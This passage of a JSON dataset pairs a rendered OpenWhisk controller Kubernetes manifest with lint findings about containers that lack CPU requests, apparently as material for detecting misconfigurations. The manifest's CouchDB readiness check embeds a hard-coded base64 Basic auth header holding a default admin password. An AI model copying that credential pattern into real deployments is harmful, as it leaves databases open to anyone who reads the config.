CONFIG_whisk_concurrencyLimit_std\n          value: '1'\n        - name: CONFIG_whisk_logLimit_min\n          value: 0m\n        - name: CONFIG_whisk_logLimit_max\n          value: 10m\n        - name: CONFIG_whisk_logLimit_std\n          value: 10m\n        - name: CONFIG_whisk_activation_payload_max\n          value: '1048576'\n        - name: CONFIG_whisk_loadbalancer_blackboxFraction\n          value: 10%\n        - name: CONFIG_whisk_loadbalancer_timeoutFactor\n          value: '2'\n        - name: KAFKA_HOSTS\n          value: RELEASE-NAME-kafka-0.RELEASE-NAME-kafka.default.svc.cluster.local:9092\n        - name: CONFIG_whisk_kafka_replicationFactor\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_cacheInvalidation_retentionBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_cacheInvalidation_retentionMs\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_cacheInvalidation_segmentBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_completed_retentionBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_completed_retentionMs\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_completed_segmentBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_events_retentionBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_events_retentionMs\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_events_segmentBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_health_retentionBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_health_retentionMs\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_health_segmentBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_invoker_retentionBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_invoker_retentionMs\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_invoker_segmentBytes\n          value: ''\n        - name: CONFIG_whisk_couchdb_username\n          valueFrom:\n            secretKeyRef:\n              name: RELEASE-NAME-db.auth\n              key: db_username\n        - name: CONFIG_whisk_couchdb_password\n          valueFrom:\n            secretKeyRef:\n              name: RELEASE-NAME-db.auth\n              key: db_password\n        - name: CONFIG_whisk_couchdb_port\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-db.config\n              key: db_port\n        - name: CONFIG_whisk_couchdb_protocol\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-db.config\n              key: db_protocol\n        - name: CONFIG_whisk_couchdb_host\n          value: RELEASE-NAME-couchdb.default.svc.cluster.local\n        - name: CONFIG_whisk_couchdb_provider\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-db.config\n              key: db_provider\n        - name: CONFIG_whisk_couchdb_databases_WhiskActivation\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-db.config\n              key: db_whisk_activations\n        - name: CONFIG_whisk_couchdb_databases_WhiskEntity\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-db.config\n              key: db_whisk_actions\n        - name: CONFIG_whisk_couchdb_databases_WhiskAuth\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-db.config\n              key: db_whisk_auths\n        - name: CONTROLLER_INSTANCES\n          value: '1'\n        - name: CONFIG_logback_log_level\n          value: INFO\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"controller\" has cpu request 0"
  },
  {
    "id": "10553",
    "manifest_path": "data/manifests/the_stack_sample/sample_4076.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: RELEASE-NAME-controller\n  labels:\n    name: RELEASE-NAME-controller\n    heritage: Helm\n    release: RELEASE-NAME\n    chart: openwhisk-1.0.1\n    app: RELEASE-NAME-openwhisk\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: RELEASE-NAME-controller\n  template:\n    metadata:\n      labels:\n        name: RELEASE-NAME-controller\n        heritage: Helm\n        release: RELEASE-NAME\n        chart: openwhisk-1.0.1\n        app: RELEASE-NAME-openwhisk\n    spec:\n      serviceAccountName: RELEASE-NAME-core\n      affinity:\n        nodeAffinity:\n          preferredDuringSchedulingIgnoredDuringExecution:\n          - weight: 100\n            preference:\n              matchExpressions:\n              - key: openwhisk-role\n                operator: NotIn\n                values:\n                - invoker\n          - weight: 80\n            preference:\n              matchExpressions:\n              - key: openwhisk-role\n                operator: In\n                values:\n                - core\n        podAntiAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n          - labelSelector:\n              matchExpressions:\n              - key: name\n                operator: In\n                values:\n                - RELEASE-NAME-controller\n            topologyKey: kubernetes.io/hostname\n      initContainers:\n      - name: wait-for-kafka\n        image: openwhisk/ow-utils:3e6138d\n        imagePullPolicy: IfNotPresent\n        command:\n        - sh\n        - -c\n        - 'cacert=\"/var/run/secrets/kubernetes.io/serviceaccount/ca.crt\"; token=\"$(cat\n          /var/run/secrets/kubernetes.io/serviceaccount/token)\"; while true; do rc=$(curl\n          -sS --cacert $cacert --header \"Authorization: Bearer $token\" https://kubernetes.default.svc/api/v1/namespaces/default/endpoints/RELEASE-NAME-kafka\n          | jq -r \".subsets[].addresses | length\"); echo \"num ready kafka endpoints\n          is $rc\"; if [ $rc -gt 0 ]; then echo \"Success: ready kafka endpoint!\"; break;\n          fi; echo \"kafka not ready yet; sleeping for 3 seconds\"; sleep 3; done;'\n      - name: wait-for-couchdb\n        image: busybox:latest\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: READINESS_URL\n          value: http://RELEASE-NAME-couchdb.default.svc.cluster.local:5984/ow_kube_couchdb_initialized_marker\n        command:\n        - sh\n        - -c\n        - 'while true; do echo ''checking CouchDB readiness''; wget -T 5 --spider\n          $READINESS_URL --header=\"Authorization: Basic d2hpc2tfYWRtaW46c29tZV9wYXNzdzByZA==\";\n          result=$?; if [ $result -eq 0 ]; then echo ''Success: CouchDB is ready!'';\n          break; fi; echo ''...not ready yet; sleeping 3 seconds before retry''; sleep\n          3; done;'\n      containers:\n      - name: controller\n        imagePullPolicy: IfNotPresent\n        image: openwhisk/controller:3e6138d\n        command:\n        - /bin/bash\n        - -c\n        - /init.sh `hostname | awk -F '-' '{print $NF}'`\n        ports:\n        - name: controller\n          containerPort: 8080\n        - name: akka-remoting\n          containerPort: 2552\n        - name: akka-mgmt-http\n          containerPort: 19999\n        livenessProbe:\n          httpGet:\n            path: /ping\n            port: 8080\n            scheme: HTTP\n          initialDelaySeconds: 10\n          periodSeconds: 10\n          timeoutSeconds: 1\n        readinessProbe:\n          httpGet:\n            path: /ping\n            port: 8080\n            scheme: HTTP\n          initialDelaySeconds: 10\n          periodSeconds: 10\n          timeoutSeconds: 1\n        env:\n        - name: PORT\n          value: '8080'\n        - name: TZ\n          value: UTC\n        - name: CONFIG_whisk_info_date\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-whisk.config\n              key: whisk_info_date\n        - name: CONFIG_whisk_info_buildNo\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-whisk.config\n              key: whisk_info_buildNo\n        - name: JAVA_OPTS\n          value: '-Xmx1024M '\n        - name: CONTROLLER_OPTS\n          value: ' '\n        - name: RUNTIMES_MANIFEST\n          value: \"{\\n    \\\"runtimes\\\": {\\n        \\\"nodejs\\\": [\\n            {\\n \\\n            \\               \\\"kind\\\": \\\"nodejs:12\\\",\\n                \\\"default\\\"\\\n            : false,\\n                \\\"image\\\": {\\n                    \\\"prefix\\\"\\\n            : \\\"openwhisk\\\",\\n                    \\\"name\\\": \\\"action-nodejs-v12\\\"\\\n            ,\\n                    \\\"tag\\\": \\\"1.19.0\\\"\\n                },\\n     \\\n            \\           \\\"deprecated\\\": false,\\n                \\\"attached\\\": {\\n\\\n            \\                    \\\"attachmentName\\\": \\\"codefile\\\",\\n             \\\n            \\       \\\"attachmentType\\\": \\\"text/plain\\\"\\n                }\\n      \\\n            \\      },\\n            {\\n                \\\"kind\\\": \\\"nodejs:14\\\",\\n \\\n            \\               \\\"default\\\": true,\\n                \\\"image\\\": {\\n   \\\n            \\                 \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"name\\\"\\\n            : \\\"action-nodejs-v14\\\",\\n                    \\\"tag\\\": \\\"1.19.0\\\"\\n  \\\n            \\              },\\n                \\\"deprecated\\\": false,\\n          \\\n            \\      \\\"attached\\\": {\\n                    \\\"attachmentName\\\": \\\"codefile\\\"\\\n            ,\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\n          \\\n            \\      },\\n                \\\"stemCells\\\": [\\n                    {\\n \\\n            \\                       \\\"initialCount\\\": 2,\\n                       \\\n            \\ \\\"memory\\\": \\\"256 MB\\\",\\n                        \\\"reactive\\\": {\\n \\\n            \\                           \\\"minCount\\\": 1,\\n                       \\\n            \\     \\\"maxCount\\\": 4,\\n                            \\\"ttl\\\": \\\"2 minutes\\\"\\\n            ,\\n                            \\\"threshold\\\": 1,\\n                   \\\n            \\         \\\"increment\\\": 1\\n                        }\\n              \\\n            \\      }\\n                ]\\n            }\\n        ],\\n        \\\"python\\\"\\\n            : [\\n            {\\n                \\\"kind\\\": \\\"python:3\\\",\\n        \\\n            \\        \\\"default\\\": true,\\n                \\\"image\\\": {\\n          \\\n            \\          \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"name\\\": \\\"\\\n            action-python-v3.7\\\",\\n                    \\\"tag\\\": \\\"1.17.0\\\"\\n     \\\n            \\           },\\n                \\\"deprecated\\\": false,\\n             \\\n            \\   \\\"attached\\\": {\\n                    \\\"attachmentName\\\": \\\"codefile\\\"\\\n            ,\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\n          \\\n            \\      }\\n            }\\n        ],\\n        \\\"swift\\\": [\\n          \\\n            \\  {\\n                \\\"kind\\\": \\\"swift:4.2\\\",\\n                \\\"default\\\"\\\n            : true,\\n                \\\"image\\\": {\\n                    \\\"prefix\\\"\\\n            : \\\"openwhisk\\\",\\n                    \\\"name\\\": \\\"action-swift-v4.2\\\"\\\n            ,\\n                    \\\"tag\\\": \\\"1.17.0\\\"\\n                },\\n     \\\n            \\           \\\"deprecated\\\": false,\\n                \\\"attached\\\": {\\n\\\n            \\                    \\\"attachmentName\\\": \\\"codefile\\\",\\n             \\\n            \\       \\\"attachmentType\\\": \\\"text/plain\\\"\\n                }\\n      \\\n            \\      },\\n            {\\n                \\\"kind\\\": \\\"swift:5.1\\\",\\n \\\n            \\               \\\"default\\\": false,\\n                \\\"image\\\": {\\n  \\\n            \\                  \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"\\\n            name\\\": \\\"action-swift-v5.1\\\",\\n                    \\\"tag\\\": \\\"1.17.0\\\"\\\n            \\n                },\\n                \\\"deprecated\\\": false,\\n       \\\n            \\         \\\"attached\\\": {\\n                    \\\"attachmentName\\\": \\\"\\\n            codefile\\\",\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\n\\\n            \\                }\\n            },\\n            {\\n                \\\"\\\n            kind\\\": \\\"swift:5.3\\\",\\n                \\\"default\\\": false,\\n        \\\n            \\        \\\"image\\\": {\\n                    \\\"prefix\\\": \\\"openwhisk\\\",\\n\\\n            \\                    \\\"name\\\": \\\"action-swift-v5.3\\\",\\n              \\\n            \\      \\\"tag\\\": \\\"1.17.0\\\"\\n                },\\n                \\\"deprecated\\\"\\\n            : false,\\n                \\\"attached\\\": {\\n                    \\\"attachmentName\\\"\\\n            : \\\"codefile\\\",\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\\n            \\n                }\\n            },\\n            {\\n                \\\"\\\n            kind\\\": \\\"swift:5.4\\\",\\n                \\\"default\\\": false,\\n        \\\n            \\        \\\"image\\\": {\\n                    \\\"prefix\\\": \\\"openwhisk\\\",\\n\\\n            \\                    \\\"name\\\": \\\"action-swift-v5.4\\\",\\n              \\\n            \\      \\\"tag\\\": \\\"1.17.0\\\"\\n                },\\n                \\\"deprecated\\\"\\\n            : false,\\n                \\\"attached\\\": {\\n                    \\\"attachmentName\\\"\\\n            : \\\"codefile\\\",\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\\n            \\n                }\\n            }\\n        ],\\n        \\\"java\\\": [\\n\\\n            \\            {\\n                \\\"kind\\\": \\\"java:8\\\",\\n              \\\n            \\  \\\"default\\\": true,\\n                \\\"image\\\": {\\n                \\\n            \\    \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"name\\\": \\\"java8action\\\"\\\n            ,\\n                    \\\"tag\\\": \\\"1.17.0\\\"\\n                },\\n     \\\n            \\           \\\"deprecated\\\": false,\\n                \\\"attached\\\": {\\n\\\n            \\                    \\\"attachmentName\\\": \\\"jarfile\\\",\\n              \\\n            \\      \\\"attachmentType\\\": \\\"application/java-archive\\\"\\n            \\\n            \\    },\\n                \\\"requireMain\\\": true\\n            }\\n      \\\n            \\  ],\\n        \\\"php\\\": [\\n            {\\n                \\\"kind\\\": \\\"\\\n            php:7.3\\\",\\n                \\\"default\\\": false,\\n                \\\"deprecated\\\"\\\n            : false,\\n                \\\"image\\\": {\\n                    \\\"prefix\\\"\\\n            : \\\"openwhisk\\\",\\n                    \\\"name\\\": \\\"action-php-v7.3\\\",\\n\\\n            \\                    \\\"tag\\\": \\\"1.17.0\\\"\\n                },\\n       \\\n            \\         \\\"attached\\\": {\\n                    \\\"attachmentName\\\": \\\"\\\n            codefile\\\",\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\n\\\n            \\                }\\n            },\\n            {\\n                \\\"\\\n            kind\\\": \\\"php:7.4\\\",\\n                \\\"default\\\": true,\\n           \\\n            \\     \\\"deprecated\\\": false,\\n                \\\"image\\\": {\\n         \\\n            \\           \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"name\\\":\\\n            \\ \\\"action-php-v7.4\\\",\\n                    \\\"tag\\\": \\\"1.17.0\\\"\\n    \\\n            \\            },\\n                \\\"attached\\\": {\\n                   \\\n            \\ \\\"attachmentName\\\": \\\"codefile\\\",\\n                    \\\"attachmentType\\\"\\\n            : \\\"text/plain\\\"\\n                }\\n            },\\n            {\\n \\\n            \\               \\\"kind\\\": \\\"php:8.0\\\",\\n                \\\"default\\\": false,\\n\\\n            \\                \\\"deprecated\\\": false,\\n                \\\"image\\\": {\\n\\\n            \\                    \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"\\\n            name\\\": \\\"action-php-v7.4\\\",\\n                    \\\"tag\\\": \\\"1.17.0\\\"\\n\\\n            \\                },\\n                \\\"attached\\\": {\\n               \\\n            \\     \\\"attachmentName\\\": \\\"codefile\\\",\\n                    \\\"attachmentType\\\"\\\n            : \\\"text/plain\\\"\\n                }\\n            }\\n        ],\\n     \\\n            \\   \\\"ruby\\\": [\\n            {\\n                \\\"kind\\\": \\\"ruby:2.5\\\"\\\n            ,\\n                \\\"default\\\": true,\\n                \\\"deprecated\\\"\\\n            : false,\\n                \\\"attached\\\": {\\n                    \\\"attachmentName\\\"\\\n            : \\\"codefile\\\",\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\\n            \\n                },\\n                \\\"image\\\": {\\n                 \\\n            \\   \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"name\\\": \\\"action-ruby-v2.5\\\"\\\n            ,\\n                    \\\"tag\\\": \\\"1.17.0\\\"\\n                }\\n      \\\n            \\      }\\n        ],\\n        \\\"go\\\": [\\n            {\\n             \\\n            \\   \\\"kind\\\": \\\"go:1.15\\\",\\n                \\\"default\\\": true,\\n     \\\n            \\           \\\"deprecated\\\": false,\\n                \\\"attached\\\": {\\n\\\n            \\                    \\\"attachmentName\\\": \\\"codefile\\\",\\n             \\\n            \\       \\\"attachmentType\\\": \\\"text/plain\\\"\\n                },\\n     \\\n            \\           \\\"image\\\": {\\n                    \\\"prefix\\\": \\\"openwhisk\\\"\\\n            ,\\n                    \\\"name\\\": \\\"action-golang-v1.15\\\",\\n          \\\n            \\          \\\"tag\\\": \\\"1.18.0\\\"\\n                }\\n            }\\n   \\\n            \\     ],\\n        \\\"rust\\\": [\\n            {\\n                \\\"kind\\\"\\\n            : \\\"rust:1.34\\\",\\n                \\\"default\\\": true,\\n               \\\n            \\ \\\"deprecated\\\": false,\\n                \\\"attached\\\": {\\n          \\\n            \\          \\\"attachmentName\\\": \\\"codefile\\\",\\n                    \\\"attachmentType\\\"\\\n            : \\\"text/plain\\\"\\n                },\\n                \\\"image\\\": {\\n \\\n            \\                   \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"\\\n            name\\\": \\\"action-rust-v1.34\\\",\\n                    \\\"tag\\\": \\\"1.3.0\\\"\\\n            \\n                }\\n            }\\n        ],\\n        \\\"dotnet\\\": [\\n\\\n            \\            {\\n                \\\"kind\\\": \\\"dotnet:2.2\\\",\\n          \\\n            \\      \\\"default\\\": true,\\n                \\\"deprecated\\\": false,\\n  \\\n            \\              \\\"requireMain\\\": true,\\n                \\\"image\\\": {\\n\\\n            \\                    \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"\\\n            name\\\": \\\"action-dotnet-v2.2\\\",\\n                    \\\"tag\\\": \\\"1.16.0\\\"\\\n            \\n                },\\n                \\\"attached\\\": {\\n              \\\n            \\      \\\"attachmentName\\\": \\\"codefile\\\",\\n                    \\\"attachmentType\\\"\\\n            : \\\"text/plain\\\"\\n                }\\n            },\\n            {\\n \\\n            \\               \\\"kind\\\": \\\"dotnet:3.1\\\",\\n                \\\"default\\\"\\\n            : false,\\n                \\\"deprecated\\\": false,\\n                \\\"requireMain\\\"\\\n            : true,\\n                \\\"image\\\": {\\n                    \\\"prefix\\\"\\\n            : \\\"openwhisk\\\",\\n                    \\\"name\\\": \\\"action-dotnet-v3.1\\\"\\\n            ,\\n                    \\\"tag\\\": \\\"1.16.0\\\"\\n                },\\n     \\\n            \\           \\\"attached\\\": {\\n                    \\\"attachmentName\\\": \\\"\\\n            codefile\\\",\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\n\\\n            \\                }\\n            }\\n        ],\\n        \\\"ballerina\\\":\\\n            \\ [\\n            {\\n                \\\"kind\\\": \\\"ballerina:0.990\\\",\\n \\\n            \\               \\\"default\\\": true,\\n                \\\"image\\\": {\\n   \\\n            \\                 \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"name\\\"\\\n            : \\\"action-ballerina-v0.990.2\\\",\\n                    \\\"tag\\\": \\\"nightly\\\"\\\n            \\n                },\\n                \\\"deprecated\\\": false,\\n       \\\n            \\         \\\"attached\\\": {\\n                    \\\"attachmentName\\\": \\\"\\\n            codefile\\\",\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\n\\\n            \\                }\\n            }\\n        ]\\n    },\\n    \\\"blackboxes\\\"\\\n            : [\\n        {\\n            \\\"prefix\\\": \\\"openwhisk\\\",\\n            \\\"\\\n            name\\\": \\\"dockerskeleton\\\",\\n            \\\"tag\\\": \\\"1.14.0\\\"\\n       \\\n            \\ }\\n    ]\\n}\\n\"\n        - name: LIMITS_ACTIONS_INVOKES_PERMINUTE\n          value: '60'\n        - name: LIMITS_ACTIONS_INVOKES_CONCURRENT\n          value: '30'\n        - name: LIMITS_TRIGGERS_FIRES_PERMINUTE\n          value: '60'\n        - name: LIMITS_ACTIONS_SEQUENCE_MAXLENGTH\n          value: '50'\n        - name: CONFIG_whisk_timeLimit_min\n          value: 100ms\n        - name: CONFIG_whisk_timeLimit_max\n          value: 5m\n        - name: CONFIG_whisk_timeLimit_std\n          value: 1m\n        - name: CONFIG_whisk_memory_min\n          value: 128m\n        - name: CONFIG_whisk_memory_max\n          value: 512m\n        - name: CONFIG_whisk_memory_std\n          value: 256m\n        - name: CONFIG_whisk_concurrencyLimit_min\n          value: '1'\n        - name: CONFIG_whisk_concurrencyLimit_max\n          value: '1'\n        - name: CONFIG_whisk_concurrencyLimit_std\n          value: '1'\n        - name: CONFIG_whisk_logLimit_min\n          value: 0m\n        - name: CONFIG_whisk_logLimit_max\n          value: 10m\n        - name: CONFIG_whisk_logLimit_std\n          value: 10m\n        - name: CONFIG_whisk_activation_payload_max\n          value: '1048576'\n        - name: CONFIG_whisk_loadbalancer_blackboxFraction\n          value: 10%\n        - name: CONFIG_whisk_loadbalancer_timeoutFactor\n          value: '2'\n        - name: KAFKA_HOSTS\n          value: RELEASE-NAME-kafka-0.RELEASE-NAME-kafka.default.svc.cluster.local:9092\n        - name: CONFIG_whisk_kafka_replicationFactor\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_cacheInvalidation_retentionBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_cacheInvalidation_retentionMs\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_cacheInvalidation_segmentBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_completed_retentionBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_completed_retentionMs\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_completed_segmentBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_events_retentionBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_events_retentionMs\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_events_segmentBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_health_retentionBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_health_retentionMs\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_health_segmentBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_invoker_retentionBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_invoker_retentionMs\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_invoker_segmentBytes\n          value: ''\n        - name: CONFIG_whisk_couchdb_username\n          valueFrom:\n            secretKeyRef:\n              name: RELEASE-NAME-db.auth\n              key: db_username\n        - name: CONFIG_whisk_couchdb_password\n          valueFrom:\n            secretKeyRef:\n              name: RELEASE-NAME-db.auth\n              key: db_password\n        - name: CONFIG_whisk_couchdb_port\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-db.config\n              key: db_port\n        - name: CONFIG_whisk_couchdb_protocol\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-db.config\n              key: db_protocol\n        - name: CONFIG_whisk_couchdb_host\n          value: RELEASE-NAME-couchdb.default.svc.cluster.local\n        - name: CONFIG_whisk_couchdb_provider\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-db.config\n              key: db_provider\n        - name: CONFIG_whisk_couchdb_databases_WhiskActivation\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-db.config\n              key: db_whisk_activations\n        - name: CONFIG_whisk_couchdb_databases_WhiskEntity\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-db.config\n              key: db_whisk_actions\n        - name: CONFIG_whisk_couchdb_databases_WhiskAuth\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-db.config\n              key: db_whisk_auths\n        - name: CONTROLLER_INSTANCES\n          value: '1'\n        - name: CONFIG_logback_log_level\n          value: INFO\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"wait-for-couchdb\" has cpu request 0"
  },
  {
    "id": "10554",
    "manifest_path": "data/manifests/the_stack_sample/sample_4076.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: RELEASE-NAME-controller\n  labels:\n    name: RELEASE-NAME-controller\n    heritage: Helm\n    release: RELEASE-NAME\n    chart: openwhisk-1.0.1\n    app: RELEASE-NAME-openwhisk\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: RELEASE-NAME-controller\n  template:\n    metadata:\n      labels:\n        name: RELEASE-NAME-controller\n        heritage: Helm\n        release: RELEASE-NAME\n        chart: openwhisk-1.0.1\n        app: RELEASE-NAME-openwhisk\n    spec:\n      serviceAccountName: RELEASE-NAME-core\n      affinity:\n        nodeAffinity:\n          preferredDuringSchedulingIgnoredDuringExecution:\n          - weight: 100\n            preference:\n              matchExpressions:\n              - key: openwhisk-role\n                operator: NotIn\n                values:\n                - invoker\n          - weight: 80\n            preference:\n              matchExpressions:\n              - key: openwhisk-role\n                operator: In\n                values:\n                - core\n        podAntiAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n          - labelSelector:\n              matchExpressions:\n              - key: name\n                operator: In\n                values:\n                - RELEASE-NAME-controller\n            topologyKey: kubernetes.io/hostname\n      initContainers:\n      - name: wait-for-kafka\n        image: openwhisk/ow-utils:3e6138d\n        imagePullPolicy: IfNotPresent\n        command:\n        - sh\n        - -c\n        - 'cacert=\"/var/run/secrets/kubernetes.io/serviceaccount/ca.crt\"; token=\"$(cat\n          /var/run/secrets/kubernetes.io/serviceaccount/token)\"; while true; do rc=$(curl\n          -sS --cacert $cacert --header \"Authorization: Bearer $token\" https://kubernetes.default.svc/api/v1/namespaces/default/endpoints/RELEASE-NAME-kafka\n          | jq -r \".subsets[].addresses | length\"); echo \"num ready kafka endpoints\n          is $rc\"; if [ $rc -gt 0 ]; then echo \"Success: ready kafka endpoint!\"; break;\n          fi; echo \"kafka not ready yet; sleeping for 3 seconds\"; sleep 3; done;'\n      - name: wait-for-couchdb\n        image: busybox:latest\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: READINESS_URL\n          value: http://RELEASE-NAME-couchdb.default.svc.cluster.local:5984/ow_kube_couchdb_initialized_marker\n        command:\n        - sh\n        - -c\n        - 'while true; do echo ''checking CouchDB readiness''; wget -T 5 --spider\n          $READINESS_URL --header=\"Authorization: Basic d2hpc2tfYWRtaW46c29tZV9wYXNzdzByZA==\";\n          result=$?; if [ $result -eq 0 ]; then echo ''Success: CouchDB is ready!'';\n          break; fi; echo ''...not ready yet; sleeping 3 seconds before retry''; sleep\n          3; done;'\n      containers:\n      - name: controller\n        imagePullPolicy: IfNotPresent\n        image: openwhisk/controller:3e6138d\n        command:\n        - /bin/bash\n        - -c\n        - /init.sh `hostname | awk -F '-' '{print $NF}'`\n        ports:\n        - name: controller\n          containerPort: 8080\n        - name: akka-remoting\n          containerPort: 2552\n        - name: akka-mgmt-http\n          containerPort: 19999\n        livenessProbe:\n          httpGet:\n            path: /ping\n            port: 8080\n            scheme: HTTP\n          initialDelaySeconds: 10\n          periodSeconds: 10\n          timeoutSeconds: 1\n        readinessProbe:\n          httpGet:\n            path: /ping\n            port: 8080\n            scheme: HTTP\n          initialDelaySeconds: 10\n          periodSeconds: 10\n          timeoutSeconds: 1\n        env:\n        - name: PORT\n          value: '8080'\n        - name: TZ\n          value: UTC\n        - name: CONFIG_whisk_info_date\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-whisk.config\n              key: whisk_info_date\n        - name: CONFIG_whisk_info_buildNo\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-whisk.config\n              key: whisk_info_buildNo\n        - name: JAVA_OPTS\n          value: '-Xmx1024M '\n        - name: CONTROLLER_OPTS\n          value: ' '\n        - name: RUNTIMES_MANIFEST\n          value: \"{\\n    \\\"runtimes\\\": {\\n        \\\"nodejs\\\": [\\n            {\\n \\\n            \\               \\\"kind\\\": \\\"nodejs:12\\\",\\n                \\\"default\\\"\\\n            : false,\\n                \\\"image\\\": {\\n                    \\\"prefix\\\"\\\n            : \\\"openwhisk\\\",\\n                    \\\"name\\\": \\\"action-nodejs-v12\\\"\\\n            ,\\n                    \\\"tag\\\": \\\"1.19.0\\\"\\n                },\\n     \\\n            \\           \\\"deprecated\\\": false,\\n                \\\"attached\\\": {\\n\\\n            \\                    \\\"attachmentName\\\": \\\"codefile\\\",\\n             \\\n            \\       \\\"attachmentType\\\": \\\"text/plain\\\"\\n                }\\n      \\\n            \\      },\\n            {\\n                \\\"kind\\\": \\\"nodejs:14\\\",\\n \\\n            \\               \\\"default\\\": true,\\n                \\\"image\\\": {\\n   \\\n            \\                 \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"name\\\"\\\n            : \\\"action-nodejs-v14\\\",\\n                    \\\"tag\\\": \\\"1.19.0\\\"\\n  \\\n            \\              },\\n                \\\"deprecated\\\": false,\\n          \\\n            \\      \\\"attached\\\": {\\n                    \\\"attachmentName\\\": \\\"codefile\\\"\\\n            ,\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\n          \\\n            \\      },\\n                \\\"stemCells\\\": [\\n                    {\\n \\\n            \\                       \\\"initialCount\\\": 2,\\n                       \\\n            \\ \\\"memory\\\": \\\"256 MB\\\",\\n                        \\\"reactive\\\": {\\n \\\n            \\                           \\\"minCount\\\": 1,\\n                       \\\n            \\     \\\"maxCount\\\": 4,\\n                            \\\"ttl\\\": \\\"2 minutes\\\"\\\n            ,\\n                            \\\"threshold\\\": 1,\\n                   \\\n            \\         \\\"increment\\\": 1\\n                        }\\n              \\\n            \\      }\\n                ]\\n            }\\n        ],\\n        \\\"python\\\"\\\n            : [\\n            {\\n                \\\"kind\\\": \\\"python:3\\\",\\n        \\\n            \\        \\\"default\\\": true,\\n                \\\"image\\\": {\\n          \\\n            \\          \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"name\\\": \\\"\\\n            action-python-v3.7\\\",\\n                    \\\"tag\\\": \\\"1.17.0\\\"\\n     \\\n            \\           },\\n                \\\"deprecated\\\": false,\\n             \\\n            \\   \\\"attached\\\": {\\n                    \\\"attachmentName\\\": \\\"codefile\\\"\\\n            ,\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\n          \\\n            \\      }\\n            }\\n        ],\\n        \\\"swift\\\": [\\n          \\\n            \\  {\\n                \\\"kind\\\": \\\"swift:4.2\\\",\\n                \\\"default\\\"\\\n            : true,\\n                \\\"image\\\": {\\n                    \\\"prefix\\\"\\\n            : \\\"openwhisk\\\",\\n                    \\\"name\\\": 